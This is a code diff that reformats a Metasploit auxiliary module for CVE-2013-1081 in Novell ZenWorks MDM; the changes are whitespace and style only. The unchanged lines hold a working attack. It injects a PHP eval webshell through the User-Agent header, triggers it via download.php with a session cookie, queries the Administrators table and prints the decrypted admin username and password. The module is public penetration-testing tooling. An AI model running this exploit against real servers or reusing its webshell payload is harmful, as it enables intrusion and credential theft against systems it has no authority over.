@@ -15,17 +15,15 @@ class MetasploitModule < Msf::Auxiliary
         This module attempts to pull the administrator credentials from
         a vulnerable Novell Zenworks MDM server.
       },
-      'Author' =>
-        [
-          'steponequit',
-          'Andrea Micalizzi (aka rgod)' #zdireport
-        ],
-      'References' =>
-        [
-          ['CVE', '2013-1081'],
-          ['OSVDB', '91119'],
-          ['URL', 'https://support.microfocus.com/kb/doc.php?id=7011895']
-        ],
+      'Author' => [
+        'steponequit',
+        'Andrea Micalizzi (aka rgod)' # zdireport
+      ],
+      'References' => [
+        ['CVE', '2013-1081'],
+        ['OSVDB', '91119'],
+        ['URL', 'https://support.microfocus.com/kb/doc.php?id=7011895']
+      ],
       'License' => MSF_LICENSE
     )
 
@@ -45,13 +43,13 @@ class MetasploitModule < Msf::Auxiliary
       'agent' => "<?php echo(eval($_GET['#{cmd}'])); ?>",
       'method' => "HEAD",
       'uri' => normalize_uri("#{target_uri.path}", "download.php"),
-      'headers' => {"Cookie" => "PHPSESSID=#{sess}"},
+      'headers' => { "Cookie" => "PHPSESSID=#{sess}" },
     })
-    return sess,cmd
+    return sess, cmd
   end
 
-  def get_creds(session_id,cmd_var)
-    cmd  = '$pass=mdm_ExecuteSQLQuery('
+  def get_creds(session_id, cmd_var)
+    cmd = '$pass=mdm_ExecuteSQLQuery('
     cmd << '"SELECT UserName,Password FROM Administrators where AdministratorSAKey = 1"'
     cmd << ',array(),false,-1,"","","",QUERY_TYPE_SELECT);'
     cmd << 'echo "".$pass[0]["UserName"].":".mdm_DecryptData($pass[0]["Password"])."";'
@@ -114,9 +112,10 @@ class MetasploitModule < Msf::Auxiliary
         print_status("Found Zenworks MDM, Checking application version")
         ver = res.body.to_s.match(/<p id="version">Version (.*)<\/p>/)[1]
         print_status("Found Version #{ver}")
-        session_id,cmd = setup_session()
-        user,pass = get_creds(session_id,cmd)
+        session_id, cmd = setup_session()
+        user, pass = get_creds(session_id, cmd)
         return if user.empty? and pass.empty?
+
         print_good("Got creds. Login:#{user} Password:#{pass}")
         print_good("Access the admin interface here: #{ip}:#{rport}#{target_uri.path}dashboard/")
 
@@ -125,11 +124,10 @@ class MetasploitModule < Msf::Auxiliary
         print_error("Zenworks MDM does not appear to be running at #{ip}")
         return :abort
       end
-
     rescue ::Rex::ConnectionRefused, ::Rex::HostUnreachable, ::Rex::ConnectionTimeout
     rescue ::Timeout::Error, ::Errno::EPIPE
     rescue ::OpenSSL::SSL::SSLError => e
-      return if(e.to_s.match(/^SSL_connect /) ) # strange errors / exception if SSL connection aborted
+      return if (e.to_s.match(/^SSL_connect /)) # strange errors / exception if SSL connection aborted
     end
   end
 end
